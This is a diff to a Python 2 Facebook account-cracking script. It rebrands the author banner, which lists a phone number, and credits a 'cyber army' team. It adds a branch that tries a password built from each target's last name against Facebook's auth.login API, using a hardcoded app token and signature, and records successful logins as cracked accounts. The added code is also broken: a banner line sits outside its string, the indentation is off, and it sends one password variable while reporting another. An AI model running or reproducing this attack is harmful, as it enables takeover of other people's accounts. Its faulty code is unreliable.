@@ -55,11 +55,11 @@ logo = """\033[1;93m█████████
 \033[1;93m█████████      \033[1;92m«----------✧----------»
 \033[1;93m ██ ██
 \033[1;93m╔════════════════════════════════════════════╗
-\033[1;93m║\033[1;96m* \033[1;93mAuthor  \033[1;93m : \033[1;93mArjuna•|Mr.ARJUNA-WIWAHA\033[1;93m          ║
+\033[1;93m║\033[1;96m* \033[1;93mAuthor  \033[1;93m : \033[1;93mKING ARJUNA WIWAHA\033[1;93m          ║
 \033[1;93m║\033[1;96m* \033[1;93mGitHub  \033[1;93m : \033[1;93m\033[4mhttps://Github.com/Arjunawiwaha\033[0m \033[1;93m║
 \033[1;93m║\033[1;96m* \033[1;93mWhatsApp \033[1;93m: \033[1;93m0812-8044-0535\033[1;93m                 ║
 \033[1;93m╚════════════════════════════════════════════╝"""
-
+\033[1;93m❗ SCRIP INI DIBUAT TIM PASOPATI CYBER ARMY ❗
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -395,6 +395,13 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
+else:
+							pass8 = b['last_name'] 
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							q = json.load(data)
+							if 'access_token' in q:
+								print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
+								oks.append(user+pass8)
 																	
 															
 		except:
